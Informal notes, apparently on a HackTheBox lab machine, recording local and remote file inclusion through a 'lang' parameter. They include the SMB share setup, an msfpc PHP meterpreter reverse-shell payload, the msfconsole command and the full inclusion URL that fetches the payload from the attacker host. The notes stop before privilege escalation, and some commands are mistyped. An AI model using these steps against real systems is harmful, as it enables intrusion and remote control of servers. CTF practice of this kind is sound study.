@@ -1,0 +1,26 @@
+the site had a link for language and we tried ?lang=windows/win.ini it showed us the content
+
+so next we tried responder but no use
+
+so we did smb to connect and we were successful
+
+```
+mkdir /tmp/share
+echo aa > test in /tmp/share
+service smdb start
+?lang=\\10.10.14.64\share\test.txt
+```
+
+we got our text back
+
+==msfpc== php 10.10.14.9
+
+it generated a code which we pasted on link and got shell
+
+msfconsole -q -r '/root/php-meterpreter-staged-reverse-tcp-443-php.rc'
+
+[http://10.129.1.171/blog/?lang=\\10.10.14.64\share\php-meterpreter-staged-reverse-tcp-443.php](http://10.129.1.171/blog/?lang=%5C%5C10.10.14.64%5Cshare%5Cphp-meterpreter-staged-reverse-tcp-443.php)
+
+rest i cant do it was port forwarding and some dip shit
+
+https://iammainul.medium.com/hackthebox-sniper-walkthrough-8eb2a868cefe
